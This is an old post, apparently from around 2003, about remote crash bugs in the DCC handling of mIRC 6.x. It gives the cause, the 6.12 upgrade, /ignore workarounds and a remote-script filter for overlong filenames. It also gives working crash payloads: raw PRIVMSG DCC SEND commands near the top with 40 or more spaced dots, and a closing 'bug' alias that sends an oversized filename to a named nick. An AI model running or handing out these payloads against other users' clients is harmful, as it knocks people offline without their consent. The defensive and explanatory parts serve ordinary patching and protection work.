mIRC DCC Exploit

It appears that mIRC 6 has an vuln via the dcc.

If you use the following command people with this version who haven't protected themselves are vulnrable to this command, which will crash their mIRC: /raw PRIVMSG nickhere :DCC SEND ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . ." 0 0 0

This works also: //RAW PRIVMSG $nick :DCC SEND $+(",$str(. $+ $chr(32),40),") 0 0 0

Use: '/ignore -dw *' to protect your client NOW.

For more information see here: http://www.irchelp.org/irchelp/mirc/exploit.html the cause: After parsing 40 (28 hex) spaces, it will stop inserting nulls and then end up dying in function 4ede70
so any filename with 40+ spaces in will crash it
mIRC v6.12 has been released to address a remote vulnerability found yesterday, capable of crashing your mIRC. The vulnerability affects versions of mIRC from v6.0 onwards, so it is highly recommended that you upgrade to mIRC v6.12.

http://ftp.newnet.co.uk/pub/mirrors/mirc/mirc612.exe or http://www.mirc.com/get.html

You could also use: http://www.erler.org/Olathe/exploit%20fix.mrc for a quick fix

DCC Exploit Affecting 6.12

On Oct 20, another exploit was identified which can crash even the recently released version 6.12. It only seems to affect people who minimize DCC get dialog windows (manually or by default), and then open those windows to get a file with an excessively long filename. You can't be crashed unless that sequence of events occurs. That manual step is required. If you auto-get the file, or don't get the file at all, nothing happens.

If and only if you think the above affects you, then here is a temporary fix which should be pasted in your "remotes" section (alt-r to access). It basically rejects any excessively long filename. 
ctcp *:dcc send:*: if ($len($nopath($filename)) >= 225) { echo 4 -s $nick tried to crash you with an illegal dcc send of $nopath($filename) | halt }
or this shorter version without the warning message:
ctcp *:dcc send:*: if ($len($nopath($filename)) >= 225) halt,
If you are not comfortable with modifying your remotes, you can just ignore all incoming DCC sends with the following, which is the same temporary fix as for the other bug described in the next section: 
/ignore -wd *

DCC Exploit Affecting 6.0-6.11
  Starting Oct 12, 2003, an exploit was used to crash many people's mIRC clients.
  All versions from 6.0 thru 6.11 were affected, version 6.12 was released Oct 13 to fix the problem. The exploit involves a DCC command which can be sent to any person or channel, no matter what your DCC options are. (DCC is used to trade files or for DCC chat.) Just download the new version to fix this problem.

Check EFnet #mIRC topic (use /raw list #mIRC if you cannot join) for updates too. The information was contributed by EFnet helpers from many sources, working together in harmony without ego or drama, who knew. It is not an official message from the author of mIRC.

Source: http://www.irchelp.org/irchelp/mirc/exploit.html

The bug code is:
  ;usage: /bug nick
  alias bug { .raw PRIVMSG $$1 $+(:,$chr(1),DCC) send $str($rand(a,z) $+ $chr(256),250) 
  $+ 0 $+ .txt 2130706433 $+(8192,$chr(1)) }